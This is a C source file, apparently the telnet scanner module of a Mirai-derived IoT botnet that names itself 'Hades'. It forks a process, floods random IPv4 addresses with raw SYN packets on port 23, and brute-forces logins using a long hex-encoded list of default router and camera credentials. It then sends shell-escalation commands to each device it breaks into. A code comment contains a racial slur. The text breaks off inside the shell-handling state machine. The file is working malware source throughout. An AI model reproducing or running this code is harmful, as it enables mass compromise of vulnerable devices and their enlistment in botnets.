#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "includes.h"
#include "scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
#include "resolv.h"

int scanner_pid, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void scanner_init(void)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("(Hades/scanner) failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("(Hades/scanner) failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    // Fixed "Mirai Scanner", Satuur.
    // Added some keypars, Cisco, Huawei, RouterBoards.
    // Don't move on this shit nigga.

    // Set up passwords - Default
    add_auth_entry("\x72\x6F\x6F\x74", "\x74\x61\x5A\x7A\x40\x32\x33\x34\x39\x35\x38\x35\x39", 17); // root taZz@23495859
    add_auth_entry("\x72\x6F\x6F\x74", "\x74\x73\x67\x6F\x69\x6E\x67\x6F\x6E", 13); // root tsgoingon
    add_auth_entry("\x72\x6F\x6F\x74", "\x73\x6F\x6C\x6F\x6B\x65\x79", 11); // root solokey
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x61\x64\x6D\x69\x6E", 10); // admin admin
    add_auth_entry("\x64\x65\x66\x61\x75\x6C\x74", "\x64\x65\x66\x61\x75\x6C\x74", 14); // default default
    add_auth_entry("\x75\x73\x65\x72", "\x75\x73\x65\x72", 8); // user user
    add_auth_entry("\x67\x75\x65\x73\x74", "\x67\x75\x65\x73\x74", 5); // guest guest
    add_auth_entry("\x74\x65\x6C\x6E\x65\x74\x61\x64\x6D\x69\x6E", "\x74\x65\x6C\x6E\x65\x74\x61\x64\x6D\x69\x6E", 22); // telnetadmin telnetadmin
  	add_auth_entry("\x72\x6F\x6F\x74", "\x31\x31\x31\x31", 8); // root 1111
    add_auth_entry("\x72\x6F\x6F\x74", "\x31\x32\x33\x34", 8); // root 1234
    add_auth_entry("\x72\x6F\x6F\x74", "\x31\x32\x33\x34\x35", 9); // root 12345
    add_auth_entry("\x72\x6F\x6F\x74", "\x31\x32\x33\x34\x35\x36", 10); // root 123456
    add_auth_entry("\x72\x6F\x6F\x74", "\x35\x34\x33\x32\x31", 9); // root 54321
    add_auth_entry("\x72\x6F\x6F\x74", "\x38\x38\x38\x38\x38\x38\x38\x38", 12); // root 88888888
    add_auth_entry("\x72\x6F\x6F\x74", "\x32\x30\x30\x38\x30\x38\x32\x36", 12); // root 20080826
    add_auth_entry("\x72\x6F\x6F\x74", "\x36\x36\x36\x36\x36\x36", 10); // root 666666
    add_auth_entry("\x72\x6F\x6F\x74", "\x38\x38\x38\x38\x38\x38", 10); // root 888888
    add_auth_entry("\x72\x6F\x6F\x74", "\x31\x30\x30\x31\x63\x68\x69\x6E", 12); // root 1001chin
    add_auth_entry("\x72\x6F\x6F\x74", "\x78\x63\x33\x35\x31\x31", 10); // root xc3511
    add_auth_entry("\x72\x6F\x6F\x74", "\x76\x69\x7A\x78\x76", 9); // root vizxv
    add_auth_entry("\x72\x6F\x6F\x74", "\x35\x75\x70", 7); // root 5up
    add_auth_entry("\x72\x6F\x6F\x74", "\x6A\x76\x62\x7A\x64", 9); // root jvbzd
    add_auth_entry("\x72\x6F\x6F\x74", "\x72\x6F\x6F\x74", 8); // root root
    add_auth_entry("\x72\x6F\x6F\x74", "\x68\x67\x32\x78\x30", 9); // root hg2x0
    add_auth_entry("\x72\x6F\x6F\x74", "\x61\x64\x6D\x69\x6E", 9); // root admin
    add_auth_entry("\x72\x6F\x6F\x74", "\x5A\x74\x65\x35\x32\x31", 10); // root Zte521
    add_auth_entry("\x72\x6F\x6F\x74", "\x67\x72\x6F\x75\x74\x65\x72", 11); // root grouter
    add_auth_entry("\x72\x6F\x6F\x74", "\x74\x65\x6C\x6E\x65\x74", 10); // root telnet
    add_auth_entry("\x72\x6F\x6F\x74", "\x6F\x65\x6C\x69\x6E\x75\x78\x31\x32\x33", 14); // root oelinux123
    add_auth_entry("\x72\x6F\x6F\x74", "\x74\x6C\x37\x38\x39", 9); // root tl789
    add_auth_entry("\x72\x6F\x6F\x74", "\x47\x4D\x38\x31\x38\x32", 10); // root GM8182
    add_auth_entry("\x72\x6F\x6F\x74", "\x68\x75\x6E\x74\x35\x37\x35\x39", 12); // root hunt5759
    add_auth_entry("\x72\x6F\x6F\x74", "\x74\x65\x6C\x65\x63\x6F\x6D\x61\x64\x6D\x69\x6E", 16); // root telecomadmin
    add_auth_entry("\x72\x6F\x6F\x74", "\x64\x65\x66\x61\x75\x6C\x74", 11); // root default
    add_auth_entry("\x72\x6F\x6F\x74", "\x74\x77\x65\x38\x65\x68\x6F\x6D\x65", 13); // root twe8ehome
    add_auth_entry("\x72\x6F\x6F\x74", "\x68\x33\x63", 7); // root h3c
    add_auth_entry("\x72\x6F\x6F\x74", "\x6E\x6D\x67\x78\x5F\x77\x61\x70\x69\x61", 13); // root nmgx_wapia
    add_auth_entry("\x72\x6F\x6F\x74", "\x70\x72\x69\x76\x61\x74\x65", 11); // root private
    add_auth_entry("\x72\x6F\x6F\x74", "\x61\x62\x63\x31\x32\x33", 10); // root abc123
    add_auth_entry("\x72\x6F\x6F\x74", "\x52\x4F\x4F\x54\x35\x30\x30", 11); // root ROOT500
    add_auth_entry("\x72\x6F\x6F\x74", "\x61\x68\x65\x74\x7A\x69\x70\x38", 12); // root ahetzip8
    add_auth_entry("\x72\x6F\x6F\x74", "\x61\x6E\x6B\x6F", 8); // root anko
    add_auth_entry("\x72\x6F\x6F\x74", "\x61\x73\x63\x65\x6E\x64", 10); // root ascend
    add_auth_entry("\x72\x6F\x6F\x74", "\x62\x6C\x65\x6E\x64\x65\x72", 11); // root blender
    add_auth_entry("\x72\x6F\x6F\x74", "\x63\x61\x74\x31\x30\x32\x39", 11); // root cat1029
    add_auth_entry("\x72\x6F\x6F\x74", "\x63\x68\x61\x6E\x67\x65\x6D\x65", 12); // root changeme
    add_auth_entry("\x72\x6F\x6F\x74", "\x69\x44\x69\x72\x65\x63\x74", 11); // root iDirect
    add_auth_entry("\x72\x6F\x6F\x74", "\x69\x6E\x66\x6C\x65\x63\x74\x69\x6F\x6E", 14); // root inflection
    add_auth_entry("\x72\x6F\x6F\x74", "\x69\x70\x63\x61\x6D\x5F\x72\x74\x35\x33\x35\x30", 16); // root ipcam_rt5350
    add_auth_entry("\x72\x6F\x6F\x74", "\x73\x77\x73\x62\x7A\x6B\x67\x6E", 12); // root swsbzkgn
    add_auth_entry("\x72\x6F\x6F\x74", "\x6A\x75\x61\x6E\x74\x65\x63\x68", 12); // root juantech
    add_auth_entry("\x72\x6F\x6F\x74", "\x70\x61\x73\x73", 8); // root pass
    add_auth_entry("\x72\x6F\x6F\x74", "\x70\x61\x73\x73\x77\x6F\x72\x64", 12); // root password
    add_auth_entry("\x72\x6F\x6F\x74", "\x73\x76\x67\x6F\x64\x69\x65", 11); // root svgodie
    add_auth_entry("\x72\x6F\x6F\x74", "\x74\x30\x74\x61\x6C\x63\x30\x6E\x74\x72\x30\x6C\x34\x21", 18); // root t0talc0ntr0l4!
    add_auth_entry("\x72\x6F\x6F\x74", "\x7A\x68\x6F\x6E\x67\x78\x69\x6E\x67", 13); // root zhongxing
    add_auth_entry("\x72\x6F\x6F\x74", "\x7A\x6C\x78\x78\x2E", 9); // root zlxx.
    add_auth_entry("\x72\x6F\x6F\x74", "\x7A\x73\x75\x6E\x31\x31\x38\x38", 12); // root zsun1188
    add_auth_entry("\x72\x6F\x6F\x74", "\x78\x6D\x68\x64\x69\x70\x63", 11); // root xmhdipc
    add_auth_entry("\x72\x6F\x6F\x74", "\x6F\x68\x72\x35\x36\x37", 10); // root klv123
    add_auth_entry("\x72\x6F\x6F\x74", "\x68\x69\x33\x35\x31\x38", 10); // root hi3518
    add_auth_entry("\x72\x6F\x6F\x74", "\x37\x75\x6A\x4D\x6B\x6F\x30\x76\x69\x7A\x78\x76", 16); // root 7ujMko0vizxv
    add_auth_entry("\x72\x6F\x6F\x74", "\x37\x75\x6A\x4D\x6B\x6F\x30\x61\x64\x6D\x69\x6E", 16); // root 7ujMko0admin
    add_auth_entry("\x72\x6F\x6F\x74", "\x64\x72\x65\x61\x6D\x62\x6F\x78", 12); // root dreambox
    add_auth_entry("\x72\x6F\x6F\x74", "\x73\x79\x73\x74\x65\x6D", 10); // root system
    add_auth_entry("\x72\x6F\x6F\x74", "\x69\x6B\x77\x62", 8); // root ikwb
    add_auth_entry("\x72\x6F\x6F\x74", "\x72\x65\x61\x6C\x74\x65\x6B", 11); // root realtek
    add_auth_entry("\x72\x6F\x6F\x74", "\x75\x73\x65\x72", 8); // root user
    add_auth_entry("\x72\x6F\x6F\x74", "\x30\x30\x30\x30\x30\x30\x30\x30", 12); // root 00000000
    add_auth_entry("\x72\x6F\x6F\x74", "\x31\x32\x33\x34\x31\x32\x33\x34", 12); // root 12341234
    add_auth_entry("\x72\x6F\x6F\x74", "\x68\x75\x69\x67\x75\x33\x30\x39", 12); // root huigu309
    add_auth_entry("\x72\x6F\x6F\x74", "\x77\x69\x6E\x31\x64\x6F\x77\x73", 12); // root win1dows
    add_auth_entry("\x72\x6F\x6F\x74", "\x61\x6E\x74\x73\x6C\x71", 10); // root antslq

	// Default Router's Password
	add_auth_entry("\x61\x64\x6D\x69\x6E", "", 5); // admin <blank>
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x61\x64\x6D\x69\x6E", 10); // admin admin
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x31\x32\x33\x34", 9); // admin 1234
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x70\x61\x73\x73\x77\x6F\x72\x64", 13); // admin password
    add_auth_entry("\x41\x64\x6D\x69\x6E", "\x41\x64\x6D\x69\x6E", 10); // Admin Admin

	// Root default Passowrd
    add_auth_entry("\x72\x6F\x6F\x74", "", 4); // root <blank>
	add_auth_entry("", "\x61\x64\x6D\x69\x6E", 5); // <blank> admin
    add_auth_entry("\x72\x6F\x6F\x74", "\x61\x64\x6D\x69\x6E", 9); // root admin
    add_auth_entry("\x72\x6F\x6F\x74", "\x70\x75\x62\x6C\x69\x63", 10); // root public

	// Admin, airlive
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x6E\x69\x6D\x64\x61", 10); // admin nimda
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x61\x64\x6D\x69\x6E\x61\x64\x6D\x69\x6E", 15); // admin adminadmin
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x67\x66\x68\x6A\x6B\x6D", 11); // admin gfhjkm
	add_auth_entry("\x61\x64\x6D\x69\x6E", "\x61\x69\x72\x6C\x69\x76\x65", 12); // admin airlive
    add_auth_entry("\x61\x69\x72\x6C\x69\x76\x65", "\x61\x69\x72\x6C\x69\x76\x65", 14); // airlive airlive

	// Support
	add_auth_entry("\x73\x75\x70\x70\x6F\x72\x74", "", 7); // support <blank>
    add_auth_entry("\x73\x75\x70\x70\x6F\x72\x74", "\x73\x75\x70\x70\x6F\x72\x74", 14); // support support

	// Super 
	add_auth_entry("\x73\x75\x70\x65\x72", "\x73\x75\x70\x65\x72", 1); // super super
    add_auth_entry("\x73\x75\x70\x65\x72", "\x41\x50\x52\x40\x78\x75\x6E\x69\x4C", 14); // super APR@xuniL
	add_auth_entry("\x73\x75\x70\x65\x72", "\x7A\x78\x63\x76\x62\x6E\x6D\x2C\x2E\x2F", 15); // super zxcvbnm,./

	// ISP Router Boards
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x6F\x6E\x6C\x69\x6E\x65", 11); // admin onlime
    add_auth_entry("\x73\x75\x70\x65\x72", "\x61\x73\x6F\x6E\x67", 10); // super	asong
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x6D\x74\x73", 8); // admin	mts
    add_auth_entry("\x6D\x74\x73", "\x6D\x74\x73", 6); // mts	mts
    add_auth_entry("\x74\x65\x6C\x65\x63\x6F\x6D\x61\x64\x6D\x69\x6E", "\x61\x64\x6D\x69\x6E\x74\x65\x6C\x65\x63\x6F\x6D", 24); // telecomadmin	admintelecom
	add_auth_entry("\x6D\x67\x74\x73", "\x6D\x74\x73\x6F\x61\x6F", 10); // mgts	mtsoao
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x55\x71\x2D\x34\x47\x49\x74\x33\x4D", 14); // admin	Uq-4GIt3M
    add_auth_entry("", "\x61\x44\x6D\x31\x6E\x24\x54\x52\x38\x72", 10); // <blank> aDm1n$TR8r
    add_auth_entry("\x6B\x79\x69\x76\x73\x74\x61\x72", "\x6B\x79\x69\x76\x73\x74\x61\x72", 16); // kyivstar kyivstar
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x30\x35\x30\x38\x37\x38\x30\x35\x30\x33", 15); // admin	0508780503
    add_auth_entry("\x74\x65\x6C\x65\x6B\x6F\x6D", "\x74\x65\x6C\x65\x6B\x6F\x6D", 14); // telekom telekom
	add_auth_entry("\x73\x75\x70\x65\x72\x61\x64\x6D\x69\x6E", "\x49\x73\x24\x75\x70\x65\x72\x40\x64\x6D\x69\x6E", 22); // superadmin	Is$uper@dmin
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x64\x50\x5A\x62\x34\x47\x4A\x54\x75\x39", 15); // admin	dPZb4GJTu9
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x32\x77\x34\x66\x36\x6E\x38\x6B", 13); // admin	2w4f6n8k
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x73\x7A\x74", 8); // admin	szt
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x72\x61\x64\x6D\x69\x6E", 11); // admin	radmin
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x52\x54\x61\x64\x6D\x69\x6E\x31\x39\x37\x39", 16); // admin	RTadmin1979
	add_auth_entry("\x65\x6E\x67\x69\x6E\x65\x65\x72", "\x61\x6D\x70\x6C\x69\x66\x69\x65\x72", 17); // engineer	amplifier

	// Cisco Routers
    add_auth_entry("", "\x43\x69\x73\x63\x6F", 5); // <blank> Cisco
    add_auth_entry("\x43\x69\x73\x63\x6F", "\x43\x69\x73\x63\x6F", 10); // Cisco	Cisco
    add_auth_entry("", "\x63\x69\x73\x63\x6F", 5); // <empty> cisco
    add_auth_entry("\x63\x69\x73\x63\x6F", "\x63\x69\x73\x63\x6F", 10); // cisco cisco
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x64\x65\x66\x61\x75\x6C\x74", 12); // admin	default
	add_auth_entry("\x61\x64\x6D\x69\x6E", "\x63\x69\x73\x63\x6F", 10); // admin	cisco
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x63\x68\x61\x6E\x67\x65\x6D\x65", 13); // admin	changeme
    add_auth_entry("", "\x63", 1); // <empty> c
    add_auth_entry("", "\x63\x63", 2); // <empty> cc
    add_auth_entry("", "\x43\x69\x73\x63\x6F\x20\x72\x6F\x75\x74\x65\x72", 12); // <empty> Cisco router
    add_auth_entry("", "\x6C\x65\x74\x6D\x65\x69\x6E", 7); // <empty> letmein
	add_auth_entry("", "\x5F\x43\x69\x73\x63\x6F", 6); // <empty> _Cisco
    add_auth_entry("\x65\x6E\x61\x62\x6C\x65", "\x63\x69\x73\x63\x6F", 11); // enable cisco
    add_auth_entry("\x70\x6E\x61\x64\x6D\x69\x6E", "\x70\x6E\x61\x64\x6D\x69\x6E", 14); // pnadmin pnadmin
    add_auth_entry("\x72\x6F\x6F\x74", "\x61\x74\x74\x61\x63\x6B", 10); // root attack
    add_auth_entry("\x72\x6F\x6F\x74", "\x43\x69\x73\x63\x6F", 9); // root Cisco

    // Huawei Routers
    add_auth_entry("\x75\x73\x65\x72", "\x48\x75\x61\x77\x65\x69\x55\x73\x65\x72", 14); // user HuaweiUser
	add_auth_entry("\x76\x6F\x64\x61\x66\x6F\x6E\x65", "\x76\x6F\x64\x61\x66\x6F\x6E\x65", 16); // vodafone vodafone 
    add_auth_entry("\x64\x69\x67\x69\x63\x65\x6C", "\x64\x69\x67\x69\x63\x65\x6C", 14); // digicel digicel 
    add_auth_entry("\x61\x64\x6D\x69\x6E", "\x33\x62\x62", 8); // admin 3bb 
    add_auth_entry("\x72\x6F\x6F\x74", "\x61\x64\x6D\x69\x6E\x48\x57", 11); // root adminHW

#ifdef DEBUG
    printf("(Hades/scanner) scanner process initialized. scanning started\n");
#endif

    // Main logic loop
    while (TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

                tcph->dest = htons(23);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (TRUE)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            printf("(Hades/scanner) FD%d attempting to brute found device %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("(Hades/scanner) FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 30)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("(Hades/scanner) FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    printf("(Hades/scanner) FD%d connected. trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    printf("(Hades/scanner) FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (TRUE)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("(Hades/scanner) FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("(Hades/scanner) FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) >= 30)
                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("(Hades/scanner) FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (TRUE)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                                printf("(Hades/scanner) FD%d finished telnet negotiation\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                                printf("(Hades/scanner) FD%d received username prompt\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("(Hades/scanner) FD%d received password prompt\n", conn->fd);
#endif

                                // Send password
                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("(Hades/scanner) FD%d received shell prompt\n", conn->fd);
#endif

                                // Send enable / system / shell / sh to session to drop into shell if needed
                                table_unlock_val(TABLE_SCAN_ENABLE);
                                tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_ENABLE);
                                conn->state = SC_WAITING_LSHELL_RESP;
                            }
                            break;
                        case SC_WAITING_LSHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("(Hades/scanner) FD%d received shell prompt\n", conn->fd);
#endif

                                // Send enable / system / shell / sh to session to drop into shell if needed
                                table_unlock_val(TABLE_SCAN_LSHELL);
                                tmp_str = table_retrieve_val(TABLE_SCAN_LSHELL, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_LSHELL);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("(Hades/scanner) FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SYSTEM);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SYSTEM);

                                conn->state = SC_WAITING_SYSTEM_RESP;
                            }
                            break;
			case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("(Hades/scanner) FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SHELL);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SHELL);

                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("(Hades/scanner) FD%d received enable prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SH);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SH, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SH);

                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("(Hades/scanner) FD%d received sh prompt\n", conn->fd);
#endif

                                // Send query string
